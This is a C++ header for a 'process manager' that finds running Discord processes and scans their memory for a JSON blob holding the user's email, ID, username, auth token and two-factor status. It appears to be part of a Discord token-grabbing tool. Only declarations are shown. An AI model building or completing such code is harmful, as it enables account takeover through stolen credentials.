#pragma once 
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <vector>
#include <string>
#include <TlHelp32.h>
#include <iostream>
#include <chrono>
#include <nlohmann/json.hpp>

// signature scanning
#include "../scanner/scan.h"

// this will be our process manager
// Purpose:
// - Finding the right process to find the memory to the userinfo.
// - Scan the memory for the JSON.

// structure to save shit
struct proc {
	std::string name;
	DWORD pid;
};
// do not use user struct
// use discordInformation.user instead
struct user {
	std::string email;
	std::string id;
	std::string username;
	std::string token;
	bool twofactor = false;
};

struct discordInformation {
	std::string environment;
	std::string release;
	// user struct inside discordInformation struct.
	user user;
};

class procManager{
private:
	// Bool if the JSON has been found
	bool found = false;
	// save all child pids
	std::vector<DWORD>PIDS = {};
	// count of the child processes
	int count = 0;
	// discord versions can change anytime
	std::vector<std::wstring> versions = {L"DiscordPTB.exe", L"Discord.exe", L"DiscordDev.exe", L"DiscordCanary.exe"};

public:
	void findProc(uint32_t processID);
	discordInformation scan();
};	
